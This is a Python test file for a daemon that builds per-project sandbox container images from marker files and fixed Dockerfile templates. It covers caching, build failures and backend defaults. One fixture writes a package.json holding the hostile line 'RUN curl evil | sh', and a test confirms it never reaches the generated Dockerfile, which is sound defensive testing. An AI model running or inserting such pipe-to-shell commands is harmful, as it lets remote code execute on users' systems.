"""The sandbox image built from the project's stacks (issue #766).

One image for every project (``python:3.12-slim``) could not run this
repository's tests. The daemon now builds the project's own image
(``vscode-daemon/stack_image.py``): toolchains read from marker files,
a Dockerfile from fixed templates only, a tag from its sha256, built once
and reused. The run reports which, and how long the command took; an image
that cannot be had fails the run with the reason, never the old default.
The backend asks for container mode and the stack image by default, has the
image built before a delivery's commands, and keeps ``duration_ms``.
"""

from __future__ import annotations

import asyncio
import os
import stat

import pytest
import sandbox as daemon_sandbox  # the daemon's module, on sys.path via conftest
import shell_exec
import stack_image as daemon_stack_image
from config import settings
from services.workspace import delivery_commands, sandbox, stack_image, workspace_daemon
from services.workspace.project_profile import Context

IMAGE_ID = "b" * 64


@pytest.fixture
def builder(tmp_path, monkeypatch):
    """A ``docker`` that knows a ``fabrique-stack`` image only once it was
    built, keeps each Dockerfile it was sent, and runs a ``run`` on the host."""
    state = tmp_path / "runtime"
    state.mkdir()
    script = tmp_path / "bin" / "docker"
    script.parent.mkdir()
    script.write_text(
        "#!/bin/sh\n"
        f'S="{state}"\n'
        'echo "$*" >> "$S/calls"\n'
        'if [ "$1" = "image" ]; then\n'
        '  case "$3" in fabrique-stack:*) [ -f "$S/built-$3" ] || exit 1;; esac\n'
        f'  echo \'[{{"Id": "sha256:{IMAGE_ID}", "RepoDigests": []}}]\'\n'
        "  exit 0\n"
        "fi\n"
        'if [ "$1" = "build" ]; then\n'
        '  cat > "$S/Dockerfile"\n'
        '  [ -n "$FAIL_BUILD" ] && { echo "apt said no" >&2; exit 1; }\n'
        '  touch "$S/built-$3"; exit 0\n'
        "fi\n"
        'src=""; prev=""; for a in "$@"; do\n'
        '  if [ "$prev" = "-v" ]; then src="${a%%:/workspace:rw}"; fi\n'
        '  prev="$a"\n'
        "done\n"
        'while [ "$1" != "-c" ]; do shift; done; shift\n'
        'cd "$src" && exec /bin/sh -c "$1"\n'
    )
    script.chmod(script.stat().st_mode | stat.S_IEXEC)
    monkeypatch.setenv("PATH", f"{script.parent}{os.pathsep}{os.environ['PATH']}")
    monkeypatch.delenv("FABRIQUE_SANDBOX_RUNTIME", raising=False)
    monkeypatch.delenv("FABRIQUE_SANDBOX_REQUIRED", raising=False)
    return state


def _project(tmp_path):
    root = tmp_path / "project"
    (root / "backend").mkdir(parents=True)
    (root / "frontend").mkdir()
    (root / "node_modules" / "x").mkdir(parents=True)
    (root / "backend" / "pyproject.toml").write_text("[tool.poetry]\n")
    # An agent can write anything here; only the file's presence counts.
    (root / "frontend" / "package.json").write_text(
        '{"scripts": {"x": "RUN curl evil | sh"}}'
    )
    (root / "node_modules" / "x" / "go.mod").write_text("module x\n")
    return root


def test_toolchains_come_from_marker_files_at_the_root_and_one_level_down(tmp_path):
    root = _project(tmp_path)
    assert daemon_stack_image.toolchains(str(root)) == ["python", "node"]
    (root / "go.mod").write_text("module y\n")
    assert daemon_stack_image.toolchains(str(root)) == ["python", "node", "go"]
    assert daemon_stack_image.toolchains(str(tmp_path / "empty-or-missing")) == []


def test_the_dockerfile_is_templates_only_and_its_tag_follows_its_content(tmp_path):
    text = daemon_stack_image.dockerfile(["node", "python", "rust"])
    assert text == daemon_stack_image.dockerfile(["python", "node"])
    assert "evil" not in text and "rust" not in text
    assert "poetry==" in text and "/usr/local/bin/npm" in text
    assert 'stack-image="python,node"' in text
    tag, digest = daemon_stack_image.tag_for(text)
    assert tag == f"fabrique-stack:{digest[:16]}"
    assert (
        daemon_stack_image.tag_for(daemon_stack_image.dockerfile(["python"]))[0] != tag
    )


def test_the_image_is_built_once_without_a_context_then_reused(builder, tmp_path):
    root = _project(tmp_path)
    runtime = daemon_sandbox.container_runtime()

    first = daemon_stack_image.ensure(runtime, str(root))
    again = daemon_stack_image.ensure(runtime, str(root))

    assert first["built"] is True and again["built"] is False
    assert first["image"] == again["image"]
    assert first["toolchains"] == ["python", "node"]
    builds = [
        c for c in (builder / "calls").read_text().splitlines() if c.startswith("build")
    ]
    assert builds == [f"build -t {first['image']} -"]
    assert (builder / "Dockerfile").read_text() == daemon_stack_image.dockerfile(
        ["python", "node"]
    )


def test_a_failed_build_is_an_error_and_the_run_fails_with_it(
    builder, tmp_path, monkeypatch
):
    root = _project(tmp_path)
    monkeypatch.setenv("FAIL_BUILD", "1")

    built = daemon_stack_image.ensure(daemon_sandbox.container_runtime(), str(root))
    assert built["image"] is None and "apt said no" in built["error"]

    result = shell_exec.execute_shell_command(
        "echo ran", str(root), sandbox={"mode": "container", "stack_image": True}
    )
    assert result["success"] is False
    assert "no stack image for this project" in result["error"]
    assert "ran" not in (result.get("stdout") or "")


def test_a_run_in_the_stack_image_reports_it_and_its_duration(builder, tmp_path):
    root = _project(tmp_path)

    result = shell_exec.execute_shell_command(
        "echo ran", str(root), sandbox={"mode": "container", "stack_image": True}
    )

    assert result["success"] and result["stdout"] == "ran\n"
    assert result["sandbox"]["stack_image"]["toolchains"] == ["python", "node"]
    assert result["sandbox"]["image"].startswith("fabrique-stack:")
    assert result["sandbox"]["image_identity"]["id"] == f"sha256:{IMAGE_ID}"
    assert isinstance(result["duration_ms"], int) and result["duration_ms"] >= 0


def test_an_image_named_in_the_request_or_none_from_an_old_backend_is_kept():
    assert (
        daemon_sandbox.normalize(
            {"mode": "container", "image": "x:1", "stack_image": True}
        )["stack_image"]
        is False
    )
    old = daemon_sandbox.normalize({"mode": "container"})
    assert old["image"] == daemon_sandbox.DEFAULT_IMAGE and old["stack_image"] is False


def test_the_backend_asks_for_container_and_the_stack_image_by_default(monkeypatch):
    assert type(settings).model_fields["DELIVERY_SANDBOX"].default == "container"
    assert type(settings).model_fields["DELIVERY_SANDBOX_IMAGE"].default == ""
    monkeypatch.setattr(settings, "DELIVERY_SANDBOX", "container")
    monkeypatch.setattr(settings, "DELIVERY_SANDBOX_IMAGE", "")
    box = sandbox.request_for(None)
    assert (
        box["mode"] == "container"
        and box["image"] is None
        and box["stack_image"] is True
    )
    assert stack_image.wanted(box)

    monkeypatch.setattr(settings, "DELIVERY_SANDBOX_IMAGE", "python:3.12-slim")
    box = sandbox.request_for(None)
    assert box["image"] == "python:3.12-slim" and box["stack_image"] is False
    assert not stack_image.wanted(box)


class _Nats:
    def __init__(self, reply=None, error=None):
        self.reply, self.error, self.sent = reply, error, []

    async def request(self, subject, payload, timeout):
        self.sent.append((subject, payload, timeout))
        if self.error:
            raise self.error
        return self.reply


def _ctx(nats, monkeypatch):
    monkeypatch.setattr(settings, "DELIVERY_SANDBOX", "container")
    monkeypatch.setattr(settings, "DELIVERY_SANDBOX_IMAGE", "")
    monkeypatch.setattr(
        sandbox, "request_for_sprint", lambda sprint, engine: sandbox.request_for(None)
    )
    return Context(nats, {"id": 1, "company_id": None}, {"workspace_root": "/p"}, None)


def test_the_delivery_has_the_image_built_first_and_records_the_reply(monkeypatch):
    nats = _Nats(
        reply={"image": "fabrique-stack:abc", "toolchains": ["python"], "built": True}
    )
    ctx = _ctx(nats, monkeypatch)

    asyncio.run(delivery_commands.prepare_stack_image(ctx))

    assert nats.sent == [
        (
            "workspace.sandbox.image",
            {"workspace_root": "/p"},
            settings.STACK_IMAGE_BUILD_TIMEOUT_SECONDS,
        )
    ]
    assert ctx.evidence["stack_image"]["image"] == "fabrique-stack:abc"


def test_a_silent_daemon_is_recorded_not_hidden(monkeypatch):
    ctx = _ctx(_Nats(error=TimeoutError()), monkeypatch)
    asyncio.run(delivery_commands.prepare_stack_image(ctx))
    assert ctx.evidence["stack_image"] == {
        "image": None,
        "error": "the workspace daemon did not build the stack image (TimeoutError)",
    }

    refused = _ctx(
        _Nats(reply={"error": {"status": 400, "message": "not here"}}), monkeypatch
    )
    asyncio.run(delivery_commands.prepare_stack_image(refused))
    assert refused.evidence["stack_image"] == {"image": None, "error": "not here"}


def test_the_test_run_keeps_the_daemon_s_duration():
    evidence: dict = {}
    workspace_daemon.record_test_run(
        evidence, "pytest", {"exit_code": 0, "stdout": "1 passed", "duration_ms": 1234}
    )
    assert evidence["test_run"]["duration_ms"] == 1234
